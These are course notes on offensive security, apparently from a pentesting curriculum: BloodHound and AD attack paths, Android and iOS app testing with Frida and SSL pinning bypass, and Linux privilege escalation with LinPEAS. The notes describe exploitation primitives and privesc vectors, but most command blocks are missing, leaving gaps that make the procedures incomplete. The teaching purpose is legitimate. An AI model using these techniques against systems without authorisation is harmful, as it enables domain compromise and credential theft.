path: PHANTOM/MODULE 4 — Active Directory Pentesting/04.6 — BloodHound & AD Attack Path Analysis.md
title: 04.6 — BloodHound & AD Attack Path Analysis
body: 04.6 — BloodHound & AD Attack Path Analysis What BloodHound Is BloodHound is a graph based Active Directory attack path analysis tool. It collects relationship data from a domain — users, groups, computers, GPOs, ACLs, sessions, trusts — and loads it into a Neo4j graph database. You can then query that graph to find the shortest paths between any two nodes. In practical terms: given a foothold as a low privilege domain user, BloodHound shows you exactly which objects you need to compromise, in which order, to reach Domain Admin. It turns a sprawling enterprise AD environment into a directed graph problem. Why it matters: Manual enumeration of AD ACLs and group memberships at enterprise scale takes days. BloodHound does it in minutes. Attack paths that are invisible to manual review (5 hop ACL chains through nested groups) are trivially visible as graph edges. Blue teams use it to find and remediate attack paths proactively — understanding it is essential for both sides. Architecture SharpHound — the collector. Queries LDAP, SMB, and RPC to build the relationship map. Runs as a .NET assembly on Windows or via from Linux. Neo4j — the graph database backend. Stores nodes (users, groups, computers) and edges (relationships between them). BloodHound GUI — the Electron application for querying and visualising the graph. Installation Kali Linux (Attacker Machine) Launching BloodHound Data Collection Method 1 — bloodhound python (From Kali, No Agent Needed) This is the preferred method when you have domain credentials but no foothold on a Windows machine yet. Method 2 — SharpHound (From a Windows Foothold) When you have a shell on a domain joined Windows machine, SharpHound runs locally and collects richer data (especially sessions and local admins). Importing Data into BloodHound The BloodHound Interface Node Types | Icon | Node Type | What It Represents | | | | | | Person | User | Domain user account | | Monitor | Computer | Domain joined machine | | Group of people | Group | Security group or distribution group | | Shield | Domain | The domain itself | | Scroll | GPO | Group Policy Object | | Folder | OU | Organisational Unit | | Container | Container | AD container object | Edge Types (Relationships) These are the attack primitives. Each edge type corresponds to an exploitable relationship: | Edge | Meaning | Exploit | | | | | | MemberOf | User/group is a member of a group | Inherit group's rights | | AdminTo | Principal has local admin rights on computer | PSExec, WMI, WinRM | | HasSession | User has an active session on a computer | Token impersonation, Mimikatz | | CanRDP | Principal can RDP to computer | xfreerdp | | CanPSRemote | Principal can use WinRM | Evil WinRM | | ExecuteDCOM | Principal can execute DCOM on computer | dcomexec.py | | GenericAll | Full control over an object | Anything — reset password, add to group, write SPN | | GenericWrite | Write access to non protected attributes | Write SPN (Kerberoast), write msDS KeyCredentialLink | | WriteOwner | Can change object owner | Take ownership → grant self GenericAll | | WriteDACL | Can modify DACL | Grant self any permission | | ForceChangePassword | Can reset password without knowing current | Reset → authenticate as victim | | AddMember | Can add members to a group | Add self → inherit group privileges | | AllExtendedRights | Has all extended rights | Includes DS Replication Get Changes → DCSync | | DCSync | Has replication rights | secretsdump DCSync | | GetChangesAll | Has GetChangesAll replication right | DCSync | | Owns | Object owner | Implicit GenericAll | | TrustedBy | Domain trust relationship | Cross domain attacks | | SQLAdmin | MSSQL admin via SPN | xp cmdshell → code execution | | AllowedToDelegate | Constrained delegation | Impersonate any user to service | | AllowedToAct | Resource based constrained delegation | RBCD attack | | AddKeyCredentialLink | Can write msDS KeyCredentialLink | Shadow Credentials attack | Pre Built Queries — The Essential List Access via: BloodHound GUI → Analysis tab → Pre Built Analytics Finding Attack Paths Custom Cypher Queries BloodHound uses Cypher (Neo4j's query language). Custom queries unlock analysis beyond the pre built options. Running custom Cypher: Marking Nodes and Tracking Progress BloodHound lets you mark nodes to track your engagement progress. Workflow: 1. Import data 2. Mark your initial foothold user as Owned 3. Run: Shortest Paths from Owned Principals to Domain Admins 4. Work through the path — as you compromise each node, mark it as Owned 5. Re run the query — the path updates to show next steps from your new position Reading and Exploiting Common Attack Paths Path Type 1 — Direct Group Membership Path Type 2 — AdminTo → HasSession Chain Path Type 3 — ACL Abuse Chain Path Type 4 — WriteDACL / WriteOwner Path Type 5 — AllExtendedRights → DCSync Path Type 6 — Kerberoastable Account with DA Path BloodHound for Blue Teams — Finding and Fixing Paths BloodHound is equally valuable defensively. Run it against your own environment to find attack paths before attackers do. Prioritised Remediation Queries Common Attack Path Remediations | Finding | Fix | | | | | User has GenericAll on Domain Admins group | Remove the ACE — audit with | | Service account in Domain Admins | Remove from DA; use dedicated service accounts with minimum permissions | | DA sessions on workstations | Enforce tiered admin model — DAs should only log onto DCs | | Unconstrained delegation computers | Convert to constrained delegation; block DA logon to these hosts | | Kerberoastable accounts on DA path | Enforce 25+ character service account passwords; use group Managed Service Accounts (gMSA) | | Stale DA accounts | Disable and quarantine accounts inactive 90 days | | Everyone/Domain Users → AdminTo | Audit local admin assignments; remove unnecessary access | Operational Considerations Reducing Collection Noise Full SharpHound collection (especially session enumeration) makes many SMB connections to every domain joined computer — very visible in network logs. When BloodHound Data Is Stale Session data becomes stale quickly — users log on and off. Group memberships and ACLs are more stable. Dealing with Large Environments On enterprise domains with tens of thousands of objects, full collection and import can be slow. Complementary Tools PowerView — Manual AD Enumeration PowerView is a PowerShell AD enumeration library that complements BloodHound for targeted queries when you know what you're looking for. bloodyAD — Python ACL Manipulation For exploiting ACL based paths from Linux (without needing a Windows shell): targetedKerberoast Allows Kerberoasting an account you have GenericWrite over by temporarily writing an SPN, requesting the TGS, then removing the SPN: BloodHound Engagement Workflow Quick Reference | Pre Built Query | What It Finds | | | | | Shortest Paths to Domain Admins | Every path from any node to DA — run first | | Find Principals with DCSync Rights | Who can dump all hashes | | Find AS REP Roastable Users | No pre auth accounts | | Find Kerberoastable Users | SPN set accounts | | Find Domain Admin Sessions | Where DA tokens are live right now | | Shortest Paths from Owned Principals | Your next steps after compromise | | Find Computers with Unconstrained Delegation | High value pivot targets | | Edge | Exploitation Tool | | | | | AdminTo | evil winrm, psexec.py, crackmapexec | | HasSession | Mimikatz on the session host | | GenericAll | bloodyAD set password / add group | | ForceChangePassword | net rpc password, bloodyAD | | WriteDACL | PowerView Add DomainObjectAcl | | AddMember | bloodyAD add groupMember | | AllExtendedRights / DCSync | secretsdump.py just dc ntlm | | GenericWrite | targetedKerberoast | | AllowedToAct | RBCD attack (impacket rbcd.py) | Related Notes 04.1 — AD Fundamentals & Enumeration 04.2 — Credential Attacks 04.3 — Privilege Escalation & Lateral Movement 04.4 — Persistence & Impacket Suite 04.5 — ADCS Certificate Abuse 00.3 — Lab Setup MODULE 3 — Network Pentesting

path: PHANTOM/MODULE 5 — Android Pentesting/05.1 — APK Fundamentals & Static Analysis.md
title: 05.1 — APK Fundamentals & Static Analysis
body: 05.1 — APK Fundamentals & Static Analysis Why Mobile App Pentesting Matters Mobile apps are a massive and under tested attack surface. They run on devices you don't control, communicate with APIs that are often less hardened than web facing ones, store data locally, and frequently contain hardcoded secrets that developers assumed would never be extracted. Android dominates global market share ( 70%). If a target has a mobile app, it deserves the same scrutiny as their web application — often more, because the dev team is smaller and the security review process is weaker. Android Architecture Fundamentals APK Structure An APK (Android Package Kit) is a ZIP file. Every app you install is one. Android Components | Component | What It Is | Security Relevance | | | | | | Activity | A screen/UI | Exported activities = directly launchable by other apps | | Service | Background process | Exported services = callable by other apps | | BroadcastReceiver | Listens for system/app events | Exported receivers = injectable intents | | ContentProvider | Shares data between apps | Exported providers = data leakage | Exported components are the attack surface. If a component is exported without permission requirements, any app (including a malicious one) on the device can interact with it. Android Permissions Model Apps declare permissions in the manifest. Two categories: Normal permissions — granted automatically (internet access, vibrate) Dangerous permissions — require runtime user approval (camera, contacts, location, storage) From a pentester's perspective: look for apps requesting dangerous permissions they don't need (over privileged), or sensitive permissions used without proper security controls. Setting Up Your Android Pentest Environment Option A — Physical Device Android phone with developer mode enabled USB debugging enabled (Settings → Developer Options → USB Debugging) Root access preferred (Magisk root) — needed for Frida, bypassing protections Option B — Android Emulator ADB — Android Debug Bridge ADB is the primary tool for communicating with Android devices/emulators from your computer. Obtaining the APK Static Analysis Static analysis examines the app without running it . You're looking at the code, configuration, and resources. Step 1 — AndroidManifest.xml Analysis The manifest is the most important file for initial triage. What to look for: Step 2 — Decompile with apktool (Smali) apktool decodes the APK to Smali — a readable representation of Dalvik bytecode. Not as readable as Java but useful for understanding logic flow and finding strings. Step 3 — Decompile with JADX (Java Source) JADX converts .dex bytecode to readable Java source code. Far more useful than Smali for understanding logic. MobSF — Mobile Security Framework MobSF is an automated static and dynamic analysis platform for Android (and iOS) apps. It performs dozens of checks automatically. Access: Upload your APK → MobSF runs: Manifest analysis (exported components, dangerous permissions, security flags) Code analysis (hardcoded secrets, insecure crypto, SQL injection in SQLite, logging) Binary analysis (debug symbols, anti debug, certificate info) CVSS scoring for each finding [!tip] MobSF gives you a rapid overview in minutes. Use it first, then dig deeper into specific findings with JADX for the things MobSF flags as interesting. Don't rely on it exclusively — it misses business logic flaws. What to Look For in Static Analysis Hardcoded Credentials and API Keys Insecure Data Storage Insecure Cryptography Network Configuration Issues Quick Reference | Check | Tool | What You Find | | | | | | Manifest analysis | apktool + manual | Exported components, flags | | Java decompilation | JADX / jadx gui | Business logic, hardcoded secrets | | Automated scan | MobSF | Overview of all static issues | | Secret hunting | grep + regex | API keys, passwords, tokens | | Crypto review | JADX grep | Weak algorithms, hardcoded keys | Related Notes 05.2 — Dynamic Analysis & Frida 05.3 — Traffic Interception & SSL Pinning Bypass 05.4 — OWASP MASVS Vulnerabilities MODULE 2 — Web Application Pentesting

path: PHANTOM/MODULE 5 — Android Pentesting/05.2 — Dynamic Analysis & Frida.md
title: 05.2 — Dynamic Analysis & Frida
body: 05.2 — Dynamic Analysis & Frida What Dynamic Analysis Is Dynamic analysis means running the app and observing its behaviour in real time . While static analysis reads the code, dynamic analysis watches what actually happens: what network requests are made, what gets written to disk, what happens when you trigger specific functions. Tools: Frida (runtime instrumentation), Objection (Frida wrapper), Drozer (component exploitation), ADB logcat, strace. Frida — Runtime Instrumentation Framework Frida lets you inject JavaScript into a running Android process and hook any function at runtime. You can: Intercept function calls and see/modify arguments and return values Bypass root detection, SSL pinning, and other security controls Call app functions directly (without triggering them through the UI) Dump decrypted data from memory Install Frida Push Frida Server to Device The Frida server runs on the Android device. It must match the Frida version on your laptop. Basic Frida Commands Frida Scripting Frida scripts are JavaScript. They run inside the target app's process. Core Concepts Practical Hooking Examples Bypass Root Detection Root detection checks for files like , presence of busybox, or test packages. Hook the check and force it to return false. Log All HTTP Traffic (when Burp proxy isn't catching everything) Dump Decryption Keys / Plaintext Hook the decrypt function and log the plaintext output before it's used: Hook SharedPreferences (Read All Stored Values) Bypass Certificate Pinning (Frida) See 05.3 — Traffic Interception & SSL Pinning Bypass for the dedicated pinning bypass section. Quick version: Objection — Frida Wrapper for Pentesters Objection wraps Frida with pre built commands for common mobile pentesting tasks. Much faster than writing scripts from scratch. Objection Commands (Inside the Shell) Drozer — Component Exploitation Drozer is a framework for exploiting exported Android components — activities, services, content providers, broadcast receivers. Setup Drozer Commands ADB Logcat — Runtime Log Analysis [!tip] Run logcat while performing every sensitive action in the app (login, payment, profile update). Developers frequently log sensitive values during debugging and forget to remove them. This catches real credentials and tokens regularly. Examining Local Data Storage After using the app for a while (log in, perform actions), inspect what was stored: Quick Reference | Tool | Purpose | Key Use Case | | | | | | Frida | Runtime JS instrumentation | Hook any function, bypass protections | | Objection | Frida wrapper | SSL bypass, root bypass, data dump | | Drozer | Component exploitation | Exploit exported activities/providers | | ADB logcat | Log monitoring | Find credentials in debug logs | | ADB shell | Device file access | Read databases, shared prefs | Related Notes 05.1 — APK Fundamentals & Static Analysis 05.3 — Traffic Interception & SSL Pinning Bypass 05.4 — OWASP MASVS Vulnerabilities

path: PHANTOM/MODULE 5 — Android Pentesting/05.3 — Traffic Interception & SSL Pinning Bypass.md
title: 05.3 — Traffic Interception & SSL Pinning Bypass
body: 05.3 — Traffic Interception & SSL Pinning Bypass Why Traffic Interception Is Central to Mobile Pentesting The majority of critical vulnerabilities in mobile apps live in the API layer — the same APIs the app talks to. To test them, you need to see and modify that traffic. This requires: 1. Routing app traffic through Burp Suite 2. Defeating SSL/TLS (certificate validation) 3. Defeating certificate pinning (the app's additional check) These are three separate problems with different solutions. Step 1 — Route Android Traffic Through Burp Suite Configure Burp Proxy Listener Burp Suite → Proxy → Options → Proxy Listeners → Add: Bind port: Bind to address: All interfaces (not just loopback) This makes Burp listen on your laptop's network IP, not just 127.0.0.1. Find Your Laptop's IP Configure Android Wi Fi Proxy 1. Connect Android device/emulator to same Wi Fi network as laptop 2. Android → Settings → Wi Fi → Long press your network → Modify Network 3. Advanced Options → Proxy → Manual 4. Proxy hostname: (your laptop IP) 5. Proxy port: 6. Save Now HTTP traffic routes through Burp. HTTPS requires the next step. Install Burp CA Certificate on Android Without this, HTTPS connections fail because Android doesn't trust Burp's self signed certificate. Android 7+ (API 24+) limitation: Android 7 and above no longer trusts user installed CAs for app traffic by default. This means the above alone won't work for most modern apps — you need to either: Use a rooted device and install Burp CA as a system CA Or modify the app's network security config (repackaging) Install Burp CA as System CA (Rooted Device) After reboot, Burp's CA is trusted as a system CA — all app HTTPS traffic is interceptable. ADB Port Forwarding (Emulator) For emulators, use reverse port forwarding instead of Wi Fi proxy: Step 2 — Defeating SSL/TLS Validation Issues Even with the CA installed, some apps do additional certificate validation. Common issues: Certificate Validation Bypass (Misconfigured Apps) Some apps disable certificate validation entirely during development and forget to re enable it: If you find this in the code → no bypass needed, traffic is already interceptable. Network Security Config — User Cert Trust If the app has a network security config that trusts user CAs, just installing Burp CA in the user store is enough: Step 3 — SSL Certificate Pinning Bypass What Certificate Pinning Is Certificate pinning is a defence where the app hardcodes the expected certificate or public key and refuses to connect if the server's certificate doesn't match — even if it's signed by a trusted CA. This means even with Burp's CA trusted as a system CA, the app rejects Burp's certificate because it doesn't match the pinned value. There are two types: Certificate pinning — pins the entire certificate (breaks when cert is renewed) Public key pinning — pins the public key (survives cert renewal, more robust) Pinning implementations vary: OkHttp TrustManager implementation Network Security Config pin set Native code (harder to bypass) Xamarin/Flutter specific implementations Bypass Method 1 — Objection (Easiest, Works 80% of the Time) Objection hooks the most common pinning implementations (OkHttp, TrustManager, Appcelerator, Cordova, Xamarin) and patches them at runtime. Try this first. Bypass Method 2 — Frida Universal SSL Kill Switch The Frida script hooks lower level SSL functions: Alternative — the Frida CodeShare universal unpinning script: Bypass Method 3 — Manual Frida Hook When you know the exact class/method doing pinning (found via JADX): Bypass Method 4 — Repackage the APK (Static Bypass) Modify the app's network security config or code to remove pinning, recompile, and re sign. No runtime tools needed. Replace with: [!tip] Some apps detect repackaging (signature mismatch = different keystore → app refuses to run). In those cases, runtime bypass (Frida/Objection) is required. Bypass Method 5 — ProxyDroid (Non Root Wi Fi Alternative) For non root devices where you can't install system CAs: Combined with installing Burp CA as a user cert (and app having in config), this can intercept traffic without root. Analysing Intercepted Traffic Once traffic flows through Burp, treat the API exactly like a web application: Handling Non HTTP Traffic Some apps use non HTTP protocols (WebSockets, MQTT, XMPP, custom binary protocols). Burp won't catch these natively. Quick Reference | Method | Requires Root | Success Rate | Use When | | | | | | | Objection | Yes | 80% | First attempt, most apps | | Frida universal script | Yes | 85% | When Objection fails | | Manual Frida hook | Yes | 95% | When you know the class | | APK repackage | No | Varies | No root, signature check bypass needed | | ProxyDroid + user CA | No | Low | Last resort, simple apps only | Related Notes 05.1 — APK Fundamentals & Static Analysis 05.2 — Dynamic Analysis & Frida 05.4 — OWASP MASVS Vulnerabilities 02.1 — OWASP Top 10 & Burp Suite

path: PHANTOM/MODULE 5 — Android Pentesting/05.4 — OWASP MASVS Vulnerabilities.md
title: 05.4 — OWASP MASVS Vulnerabilities & Testing Checklist
body: 05.4 — OWASP MASVS Vulnerabilities & Testing Checklist OWASP MASVS — Mobile Application Security Verification Standard MASVS is the mobile equivalent of the OWASP Top 10. It defines security requirements for mobile apps across 8 categories. The companion testing guide (MASTG — Mobile Application Security Testing Guide) tells you how to test each one. Reference: https://mas.owasp.org/MASVS/ MASVS STORAGE — Insecure Data Storage The most commonly found vulnerability class in Android apps. Sensitive data stored in accessible locations. Test Cases 1. SharedPreferences (Cleartext) What to look for: tokens, session IDs, passwords, usernames, user PII stored in plaintext XML. 2. SQLite Databases (Unencrypted) 3. External Storage (World Readable) 4. Logcat Data Leakage 5. Clipboard Leakage 6. App Backup Data Leakage If in manifest: 7. Auto Generated Screenshots Android auto screenshots app for the recent apps switcher. If the app shows sensitive data and doesn't set : MASVS CRYPTO — Broken Cryptography 1. Hardcoded Encryption Keys 2. Weak Algorithms 3. Insufficient Random Number Generation MASVS AUTH — Broken Authentication 1. Biometric Authentication Bypass If the app uses biometrics (fingerprint) but doesn't tie the biometric result to a cryptographic operation: 2. Token Storage Check where auth tokens are stored (SharedPreferences, SQLite, Keystore). SharedPreferences and SQLite are accessible on rooted devices — tokens should use Android Keystore. 3. Session Management Test via Burp after intercepting traffic: Does the token expire? Is it invalidated server side on logout? Can you replay an old token? MASVS NETWORK — Insecure Network Communication 1. Cleartext HTTP 2. Custom Certificate Validation (Accepting All) Look for in JADX: 3. Weak TLS Configuration MASVS PLATFORM — Platform Interaction Issues Exported Components — Deep Dives Exported Activity Exploitation: Exported Content Provider — Data Leakage: Exported BroadcastReceiver — Intent Injection: WebView Vulnerabilities WebViews are embedded browsers inside Android apps. If misconfigured, they can be exploited for XSS → file:// access → credential theft. 1. JavaScript Enabled + File Access 2. JavaScript Interface Exposure 3. Open Redirect in WebView If WebView loads URLs from intent extras: Deep Link Abuse Deep links are URLs that open specific app screens (e.g., ). MASVS CODE — Code Quality 1. Debugging Enabled in Production 2. Sensitive Data in Logs 3. Stack Trace Exposure 4. Third Party Libraries with CVEs Android Pentest Checklist Quick Reference | Vulnerability | Test Method | Tool | | | | | | Insecure SharedPrefs | Read XML files via ADB | ADB + root | | Unencrypted SQLite | Query DB via ADB | ADB + sqlite3 | | Exported activity | | ADB | | Content provider SQLi | Drozer provider query + injection | Drozer | | WebView XSS | Deep link with malicious URL | ADB | | SSL pinning | One line bypass | Objection | | Hardcoded secrets | Grep after JADX decompile | jadx + grep | | Log leakage | Monitor logcat during use | ADB logcat | Related Notes 05.1 — APK Fundamentals & Static Analysis 05.2 — Dynamic Analysis & Frida 05.3 — Traffic Interception & SSL Pinning Bypass MODULE 2 — Web Application Pentesting MODULE 9 — Labs & Practice Resources

path: PHANTOM/MODULE 5 — Android Pentesting/05.5 — iOS Pentesting.md
title: 05.5 — iOS Pentesting
body: 05.5 — iOS Pentesting Why iOS Is Different from Android Android and iOS share the same OWASP MASVS testing framework but the tooling, file formats, and security model differ significantly. | Aspect | Android | iOS | | | | | | App format | APK | IPA | | Package contents | DEX bytecode | ARM Mach O binary | | Decompilation | jadx → readable Java | Hopper/Ghidra → assembly/pseudo C | | Sideloading | Easy (enable Unknown Sources) | Requires jailbreak or developer account | | Root equivalent | Root via Magisk | Jailbreak (Checkra1n, Palera1n, Dopamine) | | Keychain | SharedPreferences / Keystore | iOS Keychain | | Data storage | SQLite, SharedPrefs, files | SQLite, NSUserDefaults, plist, Keychain | | Inter app comms | Intents | URL Schemes, Universal Links, XPC | | Primary test tool | Objection + Frida | Objection + Frida (same) | The fundamental testing methodology is identical — static analysis, dynamic analysis, traffic interception — but every individual step uses different tools and paths. Lab Requirements Jailbroken Device vs Simulator Jailbroken physical device is the gold standard. It gives you: Full filesystem access to the app's sandbox Frida gadget injection without repackaging Real world SSL pinning to bypass Real Keychain to inspect iOS Simulator (Xcode) is a fallback for static analysis and basic dynamic analysis but: Cannot run IPA files built for real devices without modification No Secure Enclave (no Keychain testing) SSL pinning is simpler and not representative of production Many Frida hooks behave differently Recommendation: Use a physical device for proper testing. Supported jailbreaks: Palera1n — A8–A11 chips (iPhone 6s to iPhone X), iOS 15–16 Dopamine — A12–A15 chips (iPhone XR to iPhone 13), iOS 15–16 Checkra1n — A5–A11 chips, iOS 12–14 (older devices) [!tip] For a dedicated lab device, an iPhone X (A11, £50 second hand) is the sweet spot — supported by Palera1n on iOS 15/16, and cheap enough to leave jailbroken permanently. Setting Up the iOS Test Environment Step 1 — Jailbreak the Device Palera1n (tethered — must re jailbreak after reboot): Step 2 — Install Frida on the Device Step 3 — SSH into the Device Step 4 — Install Objection Getting the IPA File An IPA is the iOS app package — the equivalent of an APK. Getting it is more complex than Android. Method 1 — From a Jailbroken Device (Preferred) Method 2 — Using ipatool (App Store Download) Method 3 — Charles Proxy / App Store Traffic For enterprise/in house apps distributed via MDM or direct download links, intercept the download URL and fetch the IPA directly. Static Analysis Extracting and Examining the IPA Info.plist — Configuration and Security Flags Key fields to inspect: Searching for Hardcoded Secrets in the Binary Examining Bundled Plists and Databases Binary Analysis with Hopper Disassembler Hopper is the standard iOS binary analysis tool. It decompiles Mach O binaries to pseudo C and assembly. MobSF — Automated Static Analysis Binary Security Checks A properly hardened iOS binary should have these protections: Dynamic Analysis Launching Objection Against an iOS App Objection — iOS Key Commands Inspecting the App Sandbox (Via SSH) Keychain Dumping (On Jailbroken Device) The Keychain is the secure credential store — the iOS equivalent of Android's Keystore. On a jailbroken device, Keychain items are accessible. Traffic Interception Setting Up Burp Suite for iOS SSL Pinning Bypass Many apps implement SSL pinning — they check that the server's certificate matches a hardcoded value, rejecting Burp's intercepting certificate. [!tip] If all bypass methods fail, the app may be using certificate pinning at the network library level (e.g., OkHttp pinned via Alamofire). Check the Frameworks/ directory for bundled libraries and look up their specific bypass techniques. Frida on iOS — Key Techniques Listing and Hooking Objective C Methods Bypassing Jailbreak Detection Dumping NSUserDefaults at Runtime Hooking Cryptographic Functions iOS Specific Vulnerability Testing MASVS STORAGE — Data Storage MASVS NETWORK — Insecure Network Communication MASVS AUTH — Authentication MASVS PLATFORM — Platform Issues URL Scheme Testing (Deep Links): Universal Links Testing: WKWebView Testing: MASVS CODE — Code Quality iOS Pentest Checklist Quick Reference | Test | Tool | What to Look For | | | | | | Keychain contents | Objection / keychain dumper | Plaintext credentials, tokens | | NSUserDefaults | Objection | Sensitive data outside Keychain | | SSL pinning | Objection / SSL Kill Switch 2 | App traffic visible in Burp | | Jailbreak detection | Objection / Frida hook | App runs without crashing | | Hardcoded secrets | strings + grep | API keys, passwords in binary | | ATS configuration | Info.plist | NSAllowsArbitraryLoads = true | | Deep link abuse | uiopen / Frida | IDOR, parameter injection | | Data Protection | Objection | NSProtectionNone on sensitive files | | Log leakage | Frida NSLog hook | Credentials in console output | | Binary protections | rabin2 | Missing PIE, canary, ARC | Related Notes 05.1 — APK Fundamentals & Static Analysis 05.2 — Dynamic Analysis & Frida 05.3 — Traffic Interception & SSL Pinning Bypass 05.4 — OWASP MASVS Vulnerabilities 02.3 — Authentication & Session Attacks 02.4 — Access Control, IDOR & Business Logic

path: PHANTOM/MODULE 6 — Privilege Escalation/06.1 — Linux Privilege Escalation.md
title: 06.1 — Linux Privilege Escalation
body: 06.1 — Linux Privilege Escalation What Privilege Escalation Is You have a shell as a low privilege user. Privilege escalation (privesc) is the process of elevating that to root. On Linux, root UID=0 — full control over the system. Two types: Vertical — low privilege user → root Horizontal — user A → user B (same level, different account) The methodology is always: enumerate everything, identify misconfigurations, exploit the weakest link. Initial Enumeration — The First 60 Seconds Run these manually as soon as you get a shell. Before LinPEAS, before anything automated. Build situational awareness. Sudo Misconfiguration Check What You Can Run as Root Common vulnerable output: GTFOBins — Exploit Sudo Permissions GTFOBins (https://gtfobins.github.io) documents how to escalate privileges using common Unix binaries. For every binary you can sudo, check GTFOBins. Common exploitable sudo binaries: Sudo Version Vulnerabilities SUID / SGID Binaries What SUID Is When a binary has the SUID bit set, it runs as its owner (usually root) regardless of who executes it. If a SUID binary can be abused to run arbitrary commands, you get root. Identifying Non Standard SUID Binaries Standard SUID binaries on a clean system: , , , , , . Anything else is suspicious. Exploiting SUID Binaries (GTFOBins) Check every non standard SUID binary on GTFOBins. PATH Hijacking If a SUID binary or sudo command calls another program using a relative path (e.g., instead of ), you can create a malicious binary with that name earlier in the PATH. Cron Jobs Cron jobs run scheduled commands, often as root. Misconfigured cron jobs are a common privesc path. Common Cron Misconfigurations 1. World writable script called by root cron: 2. Script in a world writable directory: 3. Wildcard injection in cron: Linux Capabilities Capabilities are a fine grained way to grant specific root privileges to processes without full root. Some capabilities can be abused for privesc. Exploiting cap setuid Exploiting cap dac read search Writable /etc/passwd If is world writable (rare but happens), add a root level user: NFS Misconfiguration NFS (Network File System) shares configured with allow an attacker with root on their own machine to create SUID files that execute as root on the target. Kernel Exploits If everything else fails, kernel exploits elevate any user to root by exploiting vulnerabilities in the Linux kernel itself. Risky — can crash the system. PwnKit (CVE 2021 4034) — Most Reliable Modern Kernel Privesc Works on virtually all Linux distributions regardless of kernel version if pkexec is installed. DirtyPipe (CVE 2022 0847) Weak File Permissions on Sensitive Files Password Reuse & Credential Hunting Spawning a TTY Shell Many initial shells are non interactive (no tab completion, no su, no sudo). Upgrade first. Quick Reference | Vector | Check Command | Exploit | | | | | | Sudo | | GTFOBins for the allowed binary | | SUID | | GTFOBins / PATH hijack | | Cron | | Modify writable script | | Capabilities | | os.setuid(0) if cap setuid | | Writable passwd | | Append root user | | NFS | | no root squash → SUID binary | | Kernel | | PwnKit, DirtyPipe, DirtyCOW | Related Notes 06.2 — Windows Privilege Escalation 06.3 — PrivEsc Tools Reference MODULE 3 — Network Pentesting MODULE 7 — Post Exploitation & Pivoting LinPEAS — Complete Guide What LinPEAS Is LinPEAS = Linux Privilege Escalation Awesome Script . It's the Linux half of the PEASS ng project (the Windows half is WinPEAS ) maintained at github.com/peass ng/PEASS ng. LinPEAS is a single bash script — no compilation, no dependencies beyond standard coreutils — that runs hundreds of checks for misconfigurations, weak permissions, sensitive files, kernel exploit indicators, and credential leaks. After your manual 60 second triage, this is the next thing you run. Getting It Onto The Target Several reliable patterns. Pick whichever the egress firewall lets you do. Useful Flags | Flag | Effect | | | | | | All checks — runs the slow ones too (rsync, GitHub hosted exploit DB checks). Default skips these. | | | Stealth — skip noisy disk/file scans | | | No colour output | | | Quiet — no banner / progress | | | Run only the listed sections ( , , , , , , , , , ) | | | Extended scan — extra checks at higher noise level | | | Help with full flag list | | | Run a host discovery on the local network (port scan lite) | | | When discovery is on, target a specific port | Reading the Output — Colour Coding This is the most important thing to internalise about LinPEAS. Don't read top to bottom. Jump straight to coloured findings. | Colour | Meaning | What you do | | | | | | 🟥 Red text on yellow background | 95%+ probability of privesc. | This is the answer. Investigate first. | | 🟥 Red text | High importance finding worth reading | Investigate next. | | 🟢 Green text | A check passed (this is informational , not a finding) | Skim | | 🔵 Blue text | Informational — system / config data | Skim | | 🟡 Yellow text | Interesting; manual triage needed | Investigate after red | The script prints a legend in the banner at the top — re read it the first time you run it. Many people miss the red on yellow vs plain red distinction. What LinPEAS Actually Checks LinPEAS sections, mapped to what each finds and why it matters: | Section | Checks | Privesc relevance | | | | | | System Information | Kernel version, OS, distro, uptime | Match kernel against kernel exploits and . Outdated kernel = potential PwnKit/DirtyPipe. | | Containers | file, patterns, namespace IDs | Lets you know you're in Docker/LXC/k8s — different escape paths apply (escape via privileged container, mounted Docker socket, capabilities like ). | | Cloud | AWS/Azure/GCP IMDS reachability, instance metadata, IAM roles | If you can curl you can steal AWS IAM creds → pivot into the AWS account. | | Network | Active TCP/UDP listeners, ARP table, routes, if readable, | Find services bound to localhost only (often unauthenticated admin panels). The ARP table tells you who else is on the LAN — pivot targets. | | Users | , shells, last logins, output, group memberships, | Identify accounts to spray, weak shells, sudo NOPASSWD entries. | | Software | Installed packages with versions ( , ), running services | Run against anything interesting. Outdated apache/mysql/openssh often → known CVE. | | Processes | snapshot, processes running as root, command lines | Look for root processes calling user writable scripts. Use for live monitoring. | | Cron / systemd timers | , , user crontabs, | Writable scripts/binaries called by root cron = direct privesc. | | SUID / SGID | , | Cross reference with GTFOBins. Custom SUID binaries deserve + reverse engineering. | | Capabilities | | on python, ruby, perl, node, gdb, php → trivial escalation. | | NFS | content, mounted NFS shares | → SUID binary trick (covered above). | | SSH | Authorized keys, known hosts, private keys in home dirs, ssh agent sockets, ssh config | Find pivot targets, agent hijack, persistent backdoor opportunities. | | Passwords | Greps for , , , , , , , , browser saved passwords (Chrome/Firefox) | Flat text creds in config files are still depressingly common. | | Software specific config | mysql , postgres trust auth, redis no auth, mongodb no auth, screen/tmux sockets | Service level misconfigs that hand you root via the service. | Manual Verification — Walking The Top Findings LinPEAS finds a lot. Each red finding still requires you to manually verify and exploit. Templates for the most common ones: When LinPEAS Misses Things LinPEAS is excellent but not omniscient. It can be: Killed by EDR — if it's blocked, fall back to manual checks or use linenum (smaller footprint), les (linux exploit suggester), or pspy64 for live process monitoring. Tricked by chroot/containers — if you're in a container, host level findings don't all apply. Verify with and treat container escape as a separate workflow. Outdated for very recent CVEs — if you hit a 2025/2026 disclosure, manually check kernel and software versions against current advisories. Linux Kernel Exploits — Reference Kernel exploits are the last resort of privesc. They have collateral risks: they may panic the kernel and reboot the box, they're often easy to detect (EDR hooks access patterns), and they may not be reliable across patches. Use them when no other vector exists. Triage Order 1. — get the exact kernel version and architecture. 2. — distro specific patches matter (Ubuntu, RHEL, and Debian backport differently). 3. Run first. 4. Cross reference with and the GitHub repo. 5. Always test in a snapshot/lab matching the target before live use. Notable Kernel & Userland Privileged Vulnerabilities | CVE | Name | Affects | Mechanism | Reliability | | | | | | | | CVE 2016 5195 | Dirty COW | Linux ≤ 4.8.3 | Race condition in copy on write of mappings of read only files. Win the race → write to read only files (e.g. or a SUID binary). | Reliable on vulnerable kernels; needs compile on target or matching arch. | | CVE 2017 1000112 | UDP frag race | 2.6.x – 4.13 | Memory corruption via UDP fragmentation reassembly | Less common today | | CVE 2019 14287 | sudo | sudo < 1.8.28 | Logic bug: was accepted and treated as root, bypassing the user restriction | Rare in modern repos but worth checking | | CVE 2021 3156 | Sudo Baron Samedit | sudo < 1.9.5p2 | Heap based buffer overflow in argv parsing — escapes single character at end of argument | High; even non sudoers can trigger if is callable | | CVE 2021 4034 | PwnKit | All distros with polkit (almost all) | can 